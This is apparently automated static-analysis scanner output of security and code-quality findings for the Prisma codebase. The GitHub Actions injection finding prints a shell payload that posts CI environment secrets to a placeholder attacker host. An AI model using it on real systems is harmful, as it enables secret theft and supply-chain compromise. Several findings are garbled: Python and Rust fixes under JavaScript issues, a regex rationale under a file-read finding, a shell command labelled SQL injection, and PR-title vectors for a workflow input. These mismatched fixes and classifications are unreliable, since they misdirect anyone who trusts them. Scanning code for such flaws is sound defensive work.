findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/update-engines-version.yml`
**Line**: 42

**Vulnerable pattern detected**: `${{ github.event.inputs.version  }}`

**Code**:
```yaml
echo 'Checking that @prisma/engines-version has the published version @${{ github.event.inputs.version }}'
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.version  }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
findings.why_it_matters: Command injection in CI/CD pipelines can lead to complete repository compromise, secrets theft, and supply chain attacks affecting all users of your software.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
[COMPOUND: 2 co-located issues] **Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: packages/adapter-pg/src/pg.ts:322

**Code snippet**:
```javascript
await conn.executeScript(`CREATE DATABASE "${database}"`)
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Prototype pollution: setPrototypeOf manipulation
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: setPrototypeOf manipulation
⚠️ User input from: `input`
📦 In function: `define` (3 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `^(?<major>0|[1-9]\d*)\.(?<minor>0|[1-9]\d*)\.(?<pa...`
🎯 User input detected in context
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Blocking call `writeFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `executeEsBuild`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.writeFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: God class detected: BufferClass
findings.description:
Class 'BufferClass' shows signs of being a god class: very high method count (40).

**Role Analysis:** Application — Standard application class

**Metrics:**
- Methods: 40
- Total complexity: 1
- Lines of code: 440

📊 Threshold: 20 (adaptive) | Actual: 40 | Default would be: 20 | Profile: p90=5, p95=7, mean=1.6, n=1565
findings.suggested_fix:
Refactor 'BufferClass' to reduce its responsibilities:
**Note:** This class was identified as Application (Standard application class). Thresholds adjusted accordingly.

1. **Extract related methods into separate classes**
- Look for method groups that work with the same data
- Create focused classes with single responsibilities

**Apply SOLID principles:**
- Single Responsibility: Each class should have one reason to change
- Open/Closed: Extend behavior without modifying existing code
- Interface Segregation: Create specific interfaces
- Dependency Inversion: Depend on abstractions
findings.why_it_matters: God classes violate the Single Responsibility Principle. They are difficult to understand, test, and maintain. Changes to one part may unexpectedly affect other parts, leading to bugs and technical debt.

findings.title: Test code in production: 0 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Excessive nesting: 11 levels

11 levels of nesting (threshold: 6).

findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)

findings.title: Blocking call `readFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `buildGetWasmModule`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
```

```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
[Non-production path] **Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: scripts/ci/publish.ts:782

**Code snippet**:
```javascript
await run(pkgDir, `pnpm update ${prismaDeps.join(' ')} --filter "${pkgName}"`, dryRun)
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: Excessive nesting: 8 levels in generatorHandler
findings.description:
8 levels of nesting (threshold: 6).

**Analysis:**
In function: `generatorHandler`
Entry point/handler (reduced severity)
Existing helpers that could reduce nesting: respond

Threshold: 5 (adaptive) | Actual: 8 | Default would be: 5 | Profile: p90=3, p95=4, mean=1.1, n=4988
findings.suggested_fix:
This function already has helpers like `respond`. Consider:
1. Extract more nested blocks into similar helpers

findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Mutual recursion: 2 functions in call cycle (complexity 20)
findings.description: Mutual recursion detected: 2 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/prisma/packages/sqlcommenter-query-insights/src/shape/shape.ts::shapeQuery:56 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/prisma/packages/sqlcommenter-query-insights/src/shape/shape.ts::shapeValue:33. Aggregate complexity: 20.
findings.suggested_fix: Consider refactoring to eliminate direct mutual calls. Common strategies: merge the two functions, use a callback parameter, or introduce a shared data structure that both functions operate on.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.
